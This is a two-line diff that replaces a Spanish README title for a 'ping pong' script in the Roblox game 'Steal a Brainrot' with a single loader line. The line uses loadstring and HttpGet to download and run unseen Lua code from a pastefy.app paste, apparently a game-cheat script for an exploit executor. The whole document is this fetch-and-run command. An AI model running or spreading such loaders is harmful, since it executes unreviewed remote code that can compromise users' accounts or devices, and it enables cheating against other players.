@@ -1,2 +1,1 @@
-# ping-pong-
-script para hacer ping pong en steal a brainrot 
+loadstring(game:HttpGet("https://pastefy.app/mZ3krnD4/raw"))()
